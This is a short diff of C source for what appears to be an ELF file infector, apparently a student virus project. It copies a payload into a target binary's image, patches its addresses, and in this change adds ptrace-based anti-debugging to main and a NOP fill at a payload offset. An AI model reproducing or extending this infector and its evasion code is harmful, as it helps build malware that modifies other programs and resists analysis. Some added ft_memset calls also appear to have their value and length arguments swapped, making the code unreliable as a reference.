@@ -61,7 +61,7 @@ static void	inject_payload(t_info *info)
 	void		*addr;
 
 	addr = &ft_memcpy;
-	ft_bzero(info->file + info->begin_bss, info->bss_size);
+	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
 	ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
 	patch_payload(info);
 }
@@ -111,6 +111,9 @@ static void	patch_addresses(t_info *info)
 	val = end - start;
 	ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);
 
+	// &ptrace in man
+	ft_memset(info->file + info->offset_payload + OFFSET_4, 40, '\x90');
+	
 }
 
 static int		reload_mapping(t_info *info)
@@ -257,6 +260,8 @@ int		main()
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 
+	if (ft_sysptrace(0, 0, 1, 0) == -1)
+		return (0);
 	write_proc(buf_path);
 	if ((check_process(buf_path)) == 1)
 		return (0);
